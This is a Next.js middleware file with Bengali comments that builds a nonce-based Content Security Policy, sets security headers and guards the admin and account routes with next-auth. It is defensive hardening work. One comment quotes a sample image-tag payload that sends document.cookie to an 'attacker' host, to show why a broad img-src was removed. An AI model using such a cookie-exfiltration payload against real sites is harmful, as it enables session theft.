import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { getToken } from 'next-auth/jwt';
import { THEME_INIT_SCRIPT } from '@/lib/themeScript';
import { SESSION_COOKIE_NAME, USE_SECURE_AUTH_COOKIES } from '@/lib/authCookies';

/**
 * ═══════════════════════════════════════════════════════
 * দুইটা কাজ:
 *   1. রুট সুরক্ষা — /admin ও /account
 *   2. নিরাপত্তা হেডার — প্রতিটা response এ
 * ═══════════════════════════════════════════════════════
 */

const isProd = process.env.NODE_ENV === 'production';

/**
 * ★★★ H3 — CSP এখন প্রতি-অনুরোধে nonce সহ তৈরি হয়।
 *
 *   ── আগে কী সমস্যা ছিল ──
 *   ১. `script-src` এ প্রোডাকশনেও `'unsafe-inline'` ছিল। CSP-র মূল
 *      উদ্দেশ্যই XSS হলে ইনজেক্ট করা `<script>` আটকানো — `unsafe-inline`
 *      থাকলে সেটি ঠিক ওই সুরক্ষাটিই বাতিল করে দেয়। অর্থাৎ হেডারটি
 *      ছিল, কিন্তু স্ক্রিপ্টের বিরুদ্ধে কার্যত নিষ্ক্রিয়।
 *   ২. `img-src` এ বেয়ার `https:` ছিল — যেকোনো origin থেকে ছবি।
 *      ছবি দিয়ে তথ্য পাচার হয় (`<img src="https://attacker/?c="+document.cookie`
 *      ধাঁচে), তাই এটি একটি প্রকৃত exfiltration পথ।
 *
 *   ── এখন ──
 *   · প্রতি অনুরোধে random nonce; কেবল সেই nonce-যুক্ত ইনলাইন স্ক্রিপ্ট চলে
 *   · `'strict-dynamic'` — nonce-বিশ্বস্ত স্ক্রিপ্ট যা লোড করে তাও চলে।
 *     Tawk.to আমাদের নিজের কোড (`LiveChat.tsx`) `createElement('script')`
 *     দিয়ে ইনজেক্ট করে, তাই সেটি এই পথেই অনুমোদিত।
 *     ⚠️ `strict-dynamic` থাকলে ব্রাউজার host-তালিকা (`https://embed.tawk.to`)
 *     **উপেক্ষা** করে — তাই সেগুলো আর script-src এ রাখা হয়নি; রাখলে
 *     মিথ্যা নিরাপত্তার ছাপ তৈরি হতো।
 *   · `img-src` থেকে বেয়ার `https:` সরানো হয়েছে
 *
 *   ⚠️ `style-src` এ `'unsafe-inline'` **রয়ে গেছে** — Next/Tailwind ও
 *   framer-motion চলমান ইনলাইন স্টাইল বসায়; nonce দিয়ে সেটি ঢাকা যায় না।
 *   স্টাইল-ইনজেকশন স্ক্রিপ্টের তুলনায় অনেক কম বিপজ্জনক, তবু এটি
 *   অসম্পূর্ণ — সৎভাবে বলে রাখা হলো, "ঠিক হয়েছে" দাবি নয়।
 */
/**
 * ★ ইনলাইন থিম-স্ক্রিপ্টের SHA-256 — একবার গণনা করে ক্যাশ।
 *
 *   কেন হ্যাশ, nonce নয়: nonce প্রতি অনুরোধে আলাদা, কিন্তু layout-এর
 *   ওই `<script>` RSC পে-লোডেও যায়। ফলে প্রথম HTML ও পরের RSC
 *   রেন্ডারে ভিন্ন nonce বসত এবং React hydration mismatch দিত
 *   (dev-এ প্রকৃতপক্ষে মাপা: `Prop nonce did not match`)।
 *   স্ক্রিপ্টটি স্থির, তাই হ্যাশ স্থির — সমস্যাটিই থাকে না।
 *
 *   ⚠️ CSP3: `'strict-dynamic'` থাকলে **host** উৎস উপেক্ষিত হয়,
 *   কিন্তু nonce ও hash উৎস কার্যকরই থাকে।
 */
let cachedThemeHash: string | null = null;
async function themeScriptHash(): Promise<string> {
  if (cachedThemeHash) return cachedThemeHash;
  const digest = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(THEME_INIT_SCRIPT),
  );
  let bin = '';
  for (const b of new Uint8Array(digest)) bin += String.fromCharCode(b);
  cachedThemeHash = `'sha256-${btoa(bin)}'`;
  return cachedThemeHash;
}

function buildCsp(nonce: string, themeHash: string): string {
  return [
    "default-src 'self'",

    // ★ nonce + strict-dynamic। dev-এ Next-এর HMR `eval` ব্যবহার করে।
    isProd
      ? `script-src 'self' 'nonce-${nonce}' ${themeHash} 'strict-dynamic'`
      : `script-src 'self' 'nonce-${nonce}' ${themeHash} 'strict-dynamic' 'unsafe-eval'`,

    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.tawk.to",
    "font-src 'self' https://fonts.gstatic.com https://*.tawk.to data:",
    // ★ বেয়ার `https:` সরানো — কেবল নিজের origin, data/blob, Blob স্টোরেজ ও Tawk
    "img-src 'self' data: blob: https://*.public.blob.vercel-storage.com https://*.tawk.to",
    // ★ Tawk.to — লাইভ চ্যাটের জন্য WebSocket + API
    "connect-src 'self' https://*.public.blob.vercel-storage.com https://*.tawk.to wss://*.tawk.to",
    "media-src 'none'",
    "object-src 'none'",           // Flash/plugin — সম্পূর্ণ বন্ধ
    // ★ Tawk.to চ্যাট উইজেট iframe ব্যবহার করে
    "frame-src https://*.tawk.to",
    "frame-ancestors 'none'",      // clickjacking — আমাদের সাইট iframe এ বসানো যাবে না
    // ফর্ম নিজের সাইটে; Google OAuth এর জন্য accounts.google.com অনুমোদিত
    "form-action 'self' https://accounts.google.com",
    "base-uri 'self'",             // <base> ট্যাগ দিয়ে হাইজ্যাক নয়
    "manifest-src 'self'",
    "worker-src 'self' blob:",
    isProd ? 'upgrade-insecure-requests' : '',
  ].filter(Boolean).join('; ');
}

function secure(res: NextResponse, csp: string): NextResponse {
  res.headers.set('Content-Security-Policy', csp);

  // ★ রিকোয়েস্ট-আইডি (observability) — লগে রিকোয়েস্ট কোরিলেট করতে,
  //   সাপোর্টে "Ref" হিসেবেও দেখানো যায়। ক্লায়েন্ট না দিলে জেনারেট।
  // (নিচে middleware() এ সেট করা হয়; এখানে থাকলে সেটাই রাখি)

  // clickjacking
  res.headers.set('X-Frame-Options', 'DENY');

  // MIME sniffing — .txt কে .js হিসেবে চালানো আটকায়
  res.headers.set('X-Content-Type-Options', 'nosniff');

  // referrer leak
  res.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // ব্রাউজার ফিচার বন্ধ
  res.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=(), usb=(), ' +
      'magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()'
  );

  // DNS prefetch দিয়ে তথ্য ফাঁস
  res.headers.set('X-DNS-Prefetch-Control', 'off');

  // ★ cross-origin isolation
  res.headers.set('Cross-Origin-Opener-Policy', 'same-origin');
  res.headers.set('Cross-Origin-Resource-Policy', 'same-origin');

  // পুরনো IE/legacy
  res.headers.set('X-Permitted-Cross-Domain-Policies', 'none');

  if (isProd) {
    // HTTPS বাধ্যতামূলক — ২ বছর
    res.headers.set(
      'Strict-Transport-Security',
      'max-age=63072000; includeSubDomains; preload'
    );
  }

  // সার্ভারের তথ্য লুকাই
  res.headers.delete('X-Powered-By');
  res.headers.delete('Server');

  return res;
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  // ★ রিকোয়েস্ট-আইডি — আগে থেকে থাকলে (প্রক্সি/CDN) সেটাই, নাহলে নতুন
  const requestId = req.headers.get('x-request-id') || crypto.randomUUID();

  // ★★★ H3 — প্রতি অনুরোধে nonce। base64 (Next-এর ডকুমেন্টেড রীতি)।
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = buildCsp(nonce, await themeScriptHash());

  /**
   * ★ nonce দুই জায়গায় যেতে হয়:
   *   ১. **রিকোয়েস্ট** হেডারে — Next নিজে এখান থেকে nonce পড়ে তার
   *      নিজস্ব bootstrap/hydration স্ক্রিপ্টে বসায়। এটি না দিলে
   *      Next-এর নিজের ইনলাইন স্ক্রিপ্টই CSP-তে আটকে যেত ও পাতা
   *      হাইড্রেট হতো না।
   *   ২. **রেসপন্স** হেডারে — ব্রাউজারের জন্য আসল নীতি।
   *   `x-nonce` আলাদা করে দেওয়া হয় যাতে `layout.tsx` আমাদের নিজের
   *   ইনলাইন থিম-স্ক্রিপ্টে সেটি বসাতে পারে।
   */
  const requestHeaders = new Headers(req.headers);
  requestHeaders.set('x-nonce', nonce);
  requestHeaders.set('Content-Security-Policy', csp);
  requestHeaders.set('x-request-id', requestId);

  const nextWithNonce = () => NextResponse.next({ request: { headers: requestHeaders } });

  const withId = (res: NextResponse): NextResponse => {
    res.headers.set('x-request-id', requestId);
    return secure(res, csp);
  };

  const isAdmin = pathname.startsWith('/admin');
  const isAccount = pathname.startsWith('/account');

  if (isAdmin || isAccount) {
    /**
     * ★★★ কুকির নাম **স্পষ্ট করে** দিতে হয়।
     *
     *   না দিলে `getToken()` নিজে অনুমান করে, আর সেই অনুমান
     *   `NEXTAUTH_URL` এর উপর দাঁড়ানো (next-auth 4.24.15 ·
     *   `jwt/index.js:65`)। লাইভ ডিপ্লয়মেন্টে ওই env https ছিল না,
     *   তাই middleware খুঁজত `next-auth.session-token` অথচ কোর
     *   লিখত `__Secure-next-auth.session-token` — অমিল। প্রতিটি
     *   `/account` ও `/admin` অনুরোধ তখন `/login` এ 307 হতো,
     *   যদিও ব্যবহারকারী প্রকৃতপক্ষে লগইন করা ছিলেন।
     *
     *   দুটোই পাঠানো হয়: `cookieName` কোন কুকি পড়া হবে তা ঠিক করে,
     *   `secureCookie` next-auth এর ভেতরের fallback পথটিও বন্ধ করে।
     */
    const token = await getToken({
      req,
      secret: process.env.NEXTAUTH_SECRET,
      cookieName: SESSION_COOKIE_NAME,
      secureCookie: USE_SECURE_AUTH_COOKIES,
    });

    if (!token?.id) {
      const url = new URL('/login', req.url);
      // ★ open redirect গার্ড — শুধু নিজের সাইটের path
      url.searchParams.set('callbackUrl', pathname);
      return withId(NextResponse.redirect(url));
    }

    // ★ অ্যাডমিন গার্ড — non-admin কখনো /admin এ ঢুকবে না
    if (isAdmin && token.role !== 'ADMIN') {
      return withId(NextResponse.redirect(new URL('/', req.url)));
    }
  }

  return withId(nextWithNonce());
}

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico|robots.txt|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico)$).*)',
  ],
};
